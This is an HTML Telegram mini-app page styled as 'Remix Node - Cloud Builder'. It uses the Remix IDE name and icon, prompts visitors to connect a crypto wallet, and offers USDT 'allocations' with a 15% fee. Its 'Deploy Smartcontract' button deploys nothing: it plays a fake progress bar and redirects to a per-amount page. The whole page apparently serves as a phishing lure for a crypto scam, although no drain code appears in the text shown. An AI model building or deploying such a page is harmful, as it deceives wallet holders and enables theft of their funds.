<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Remix Node - Cloud Builder</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    
    <script type="module">
        import { createAppKit } from 'https://esm.sh/@reown/appkit'
        import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers'
        import { bsc, mainnet } from 'https://esm.sh/@reown/appkit/networks'

        const projectId = 'cb431b6f6e2a73a72983084a5bd30989' 

        const metadata = {
            name: 'Remix Node',
            description: 'Cloud Development',
            url: window.location.origin,
            icons: ['https://remix.ethereum.org/favicon.ico']
        }

        const modal = createAppKit({
            adapters: [new EthersAdapter()],
            networks: [bsc, mainnet],
            metadata,
            projectId,
            features: { analytics: false, email: false, socials: false },
            themeMode: 'dark',
            // إعدادات قسرية لتجاوز تعليق الاتصال
            allWallets: 'SHOW',
            enableInjected: true,
            enableCoinbase: false
        })

        window.appKitModal = modal;

        // وظيفة التحديث القسري للواجهة
        function forceUpdateUI(address) {
            if (window.isWalletConnected) return;

            const btn = document.getElementById('walletBtn');
            const shortAddr = `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
            
            btn.innerHTML = `
                <div class="flex items-center gap-3">
                    <div class="w-2.5 h-2.5 bg-[#6EEB36] rounded-full animate-pulse shadow-[0_0_8px_#6EEB36]"></div>
                    <span class="text-[#6EEB36] font-mono font-bold tracking-tight uppercase">CONNECTED: ${shortAddr}</span>
                </div>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6EEB36" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
            
            btn.classList.add('border-[#6EEB36]', 'bg-[#6EEB36]/10');
            window.isWalletConnected = true;
            
            // إغلاق أي نافذة عالقة
            try { modal.close(); } catch(e) {}
            
            const mc = document.getElementById('manualCheck');
            if(mc) mc.classList.add('hidden');
            
            if (typeof validateAction === 'function') validateAction();
        }

        // مراقبة الحساب بشكل دوري مكثف جداً (Polling)
        // هذا هو "المفتاح" لحل مشكلة التعليق: لا ننتظر الحدث، بل نسأل النظام كل 100ms
        setInterval(() => {
            const account = modal.getAccount();
            if (account && account.isConnected && account.address) {
                forceUpdateUI(account.address);
            }
        }, 100);

        // وظيفة الفتح المباشر للمحفظة (Deep Link)
        window.openWalletDirectly = async function() {
            try {
                // فتح المودال في وضع الاتصال المباشر
                await modal.open({ view: 'Connect' });
                
                // إظهار زر الإصلاح اليدوي فوراً
                const mc = document.getElementById('manualCheck');
                if(mc) mc.classList.remove('hidden');
            } catch (e) {
                console.error("Connection error:", e);
            }
        }
    </script>

    <style>
        body { font-family: 'Inter', sans-serif; background-color: #000; height: 100vh; overflow: hidden; user-select: none; color: #f0f0f0; display: flex; flex-direction: column; }
        .app-overlay { position: fixed; inset: 0; background: radial-gradient(circle at center, #0a1a05 0%, #000 100%); z-index: 1; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .loading-overlay { display: none; position: fixed; inset: 0; z-index: 1000; background: #000; flex-direction: column; align-items: center; justify-content: center; }
        .content-container { position: relative; background-image: url('background.png'); background-size: cover; border-radius: 40px 40px 0 0; border-top: 2px solid rgba(110, 235, 54, 0.5); flex: 1; display: flex; flex-direction: column; margin-top: 60px; z-index: 10; }
        .content-inner { position: relative; z-index: 1; height: 100%; display: flex; flex-direction: column; padding: 24px; padding-top: 75px; }
        .profile-wrapper { position: absolute; top: 0; left: 50%; transform: translate(-50%, -50%); z-index: 100; }
        .remix-input { background: rgba(18, 18, 18, 0.85); border: 1px solid rgba(255, 255, 255, 0.08); color: #fff; backdrop-filter: blur(15px); }
        .ui-btn { padding: 22px; display: flex; align-items: center; justify-content: center; color: #6EEB36; font-weight: 900; background: rgba(110, 235, 54, 0.05); border: 1px solid rgba(110, 235, 54, 0.2); border-radius: 22px; width: 100%; text-transform: uppercase; transition: 0.4s; }
        .ui-btn.ready { background: #6EEB36; color: #000; cursor: pointer; box-shadow: 0 10px 30px rgba(110, 235, 54, 0.3); }
        #bottomSheetOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); z-index: 500; }
        #bottomSheet { position: fixed; bottom: -100%; left: 0; right: 0; background: #18181b; border-radius: 30px 30px 0 0; z-index: 501; transition: 0.45s cubic-bezier(0.32, 0.72, 0, 1); max-height: 85vh; overflow-y: auto; border-top: 1px solid rgba(110, 235, 54, 0.2); }
        #bottomSheet.active { bottom: 0; }
    </style>
</head>
<body>

    <div class="app-overlay"></div>

    <div id="loadingOverlay" class="loading-overlay">
        <div class="text-[#6EEB36] text-[10px] font-black tracking-[0.5em] uppercase mb-4">Initializing Node</div>
        <div class="w-40 h-[2px] bg-white/5 rounded-full overflow-hidden">
            <div id="progressBar" class="h-full bg-[#6EEB36] w-0 transition-all"></div>
        </div>
    </div>

    <div id="bottomSheetOverlay" onclick="closeSheet()"></div>
    <div id="bottomSheet" class="no-scrollbar">
        <div class="p-6 border-b border-white/5 flex justify-between items-center text-white text-[10px] font-black uppercase tracking-widest">Select Allocation</div>
        <div id="amountOptionsContainer" class="pb-10"></div>
    </div>

    <div class="flex-1 flex flex-col relative z-10 w-full h-full">
        <div class="h-[110px] flex items-center justify-center pt-8">
            <div class="text-center">
                <h2 id="userName" class="text-white text-[17px] font-black uppercase">REMIX NODE</h2>
                <span class="text-[#6EEB36] text-[9px] font-mono font-bold tracking-[0.2em] opacity-50 uppercase block mt-1 tracking-widest">SECURE BUILDER</span>
            </div>
        </div>

        <div class="content-container">
            <div class="profile-wrapper">
                <div class="w-28 h-28 rounded-[34px] p-[2px] bg-[#6EEB36] shadow-2xl">
                    <img id="userPhoto" src="https://ui-avatars.com/api/?name=R&background=000&color=6EEB36" class="w-full h-full rounded-[32px] object-cover" alt="User">
                </div>
            </div>

            <div class="content-inner">
                <div class="flex-1 space-y-5">
                    <div class="bg-white/5 p-4 rounded-2xl border border-white/5 flex items-center gap-4">
                        <img src="https://remix.ethereum.org/favicon.ico" class="w-6 h-6">
                        <div>
                            <h3 class="text-[12px] font-black text-white uppercase">Cloud Environment</h3>
                            <p class="text-[9px] text-white/30 uppercase font-bold tracking-wider">Ready for BSC deployment</p>
                        </div>
                    </div>

                    <!-- تم تغيير onclick إلى الوظيفة الجديدة -->
                    <button id="walletBtn" onclick="window.openWalletDirectly()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[13px] font-black uppercase tracking-widest active:scale-95 transition-all">
                        <span>Connect Wallet</span>
                        <span class="text-[#6EEB36]">›</span>
                    </button>

                    <!-- زر الفحص القسري في حال تعليق الـ Connecting -->
                    <button id="manualCheck" onclick="location.reload()" class="hidden w-full bg-[#6EEB36]/10 border border-[#6EEB36]/30 rounded-2xl p-4 text-[10px] text-[#6EEB36] font-black uppercase tracking-widest text-center animate-pulse">
                        ⚠️ Stuck on "Connecting"? Tap here to verify
                    </button>

                    <button id="amountSheetTrigger" onclick="openSheet()" class="w-full remix-input rounded-2xl p-5 flex items-center justify-between text-[13px] font-black uppercase tracking-widest active:scale-95 transition-all">
                        <span id="selectedAmountText">Select Allocation</span>
                        <span class="text-[#6EEB36]">›</span>
                    </button>
                </div>

                <div class="pb-10">
                    <button id="authorizeBtn" disabled class="ui-btn">Deploy Smartcontract</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        let selectedAmount = null;
        const amounts = [100, 300, 500, 1000, 2000, 5000];

        const user = tg.initDataUnsafe?.user;
        if (user) {
            document.getElementById('userName').textContent = (user.first_name).toUpperCase();
            if (user.photo_url) document.getElementById('userPhoto').src = user.photo_url;
        }

        function openSheet() { 
            document.getElementById('bottomSheetOverlay').style.display = 'block';
            document.getElementById('bottomSheet').classList.add('active'); 
        }
        function closeSheet() { 
            document.getElementById('bottomSheetOverlay').style.display = 'none';
            document.getElementById('bottomSheet').classList.remove('active'); 
        }

        const container = document.getElementById('amountOptionsContainer');
        amounts.forEach(amt => {
            const div = document.createElement('div');
            div.className = 'p-6 flex justify-between items-center border-b border-white/5 active:bg-white/5';
            div.innerHTML = `<span class="font-black text-white text-sm">${amt} USDT</span><span class="text-[#6EEB36] font-mono font-bold text-xs">$${(amt * 0.15).toFixed(2)} FEE</span>`;
            div.onclick = () => {
                selectedAmount = amt;
                document.getElementById('selectedAmountText').textContent = `${amt} USDT SELECTED`;
                closeSheet();
                validateAction();
            };
            container.appendChild(div);
        });

        function validateAction() {
            const btn = document.getElementById('authorizeBtn');
            if (window.isWalletConnected && selectedAmount) {
                btn.disabled = false;
                btn.classList.add('ready');
            }
        }

        document.getElementById('authorizeBtn').onclick = function() {
            if (this.disabled) return;
            document.getElementById('loadingOverlay').style.display = 'flex';
            let p = 0;
            const inv = setInterval(() => {
                p += 4; document.getElementById('progressBar').style.width = p + '%';
                if (p >= 100) { clearInterval(inv); window.location.href = selectedAmount + '.html'; }
            }, 35);
        };
    </script>
</body>
</html>
